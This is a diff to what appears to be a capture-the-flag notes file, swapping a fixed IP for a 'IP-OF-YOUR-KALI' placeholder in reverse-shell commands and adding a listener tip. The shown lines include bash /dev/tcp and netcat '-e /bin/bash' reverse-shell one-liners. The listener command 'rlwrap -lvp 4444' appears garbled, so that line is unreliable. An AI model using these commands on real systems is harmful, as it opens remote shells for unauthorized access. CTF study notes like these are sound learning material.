@@ -53,8 +53,9 @@ Strings will print human readable chars of a file. And for a CTF if we are looki
 
 - Say we have a way through root and we need to get a reverse shell here are helpfuls command
   - `/bin/bash -i >& /dev/tcp/IP-OF-YOUR-KALI/4444 0>&1`
-  - `nc 10.10.14.11 4444 –e /bin/bash`
-  - `nc 10.10.14.11 4444 –e /bin/sh`
+  - `nc IP-OF-YOUR-KALI 4444 –e /bin/bash`
+  - `nc IP-OF-YOUR-KALI 4444 –e /bin/sh`
+- *Note: We have to set a listener prior to this with `rlwrap -lvp 4444`*
 
 ## Resources
 
